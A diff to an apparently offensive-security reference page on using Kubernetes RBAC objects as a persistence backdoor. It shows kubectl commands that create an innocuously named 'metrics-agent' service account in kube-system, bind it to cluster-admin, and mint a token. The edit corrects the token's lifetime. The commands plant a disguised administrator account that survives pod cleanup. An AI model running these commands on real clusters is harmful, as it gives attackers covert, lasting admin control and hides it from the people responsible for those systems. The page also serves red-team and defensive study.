@@ -11,13 +11,13 @@ keywords:
 
 # RBAC backdoor
 
-RBAC objects are quiet persistence. A new service account bound to `cluster-admin`, a binding that grants a built-in group broad rights, or extra permissions attached to an existing default account all survive pod cleanup and look like ordinary cluster configuration. The token for the backdoored account is then durable access.
+RBAC objects are quiet persistence. A new service account bound to `cluster-admin`, a binding that grants a built-in group broad rights, or extra permissions attached to an existing default account all survive pod cleanup and look like ordinary cluster configuration. The backdoored account and its binding are the durable path back; a token is minted from them whenever needed.
 
 ```bash
 kubectl create serviceaccount metrics-agent -n kube-system
 kubectl create clusterrolebinding metrics-agent --clusterrole=cluster-admin \
   --serviceaccount=kube-system:metrics-agent
-kubectl create token metrics-agent -n kube-system       # durable admin token
+kubectl create token metrics-agent -n kube-system       # short-lived token; re-mint from the durable SA
 ```
 
 ## Exploitation notes
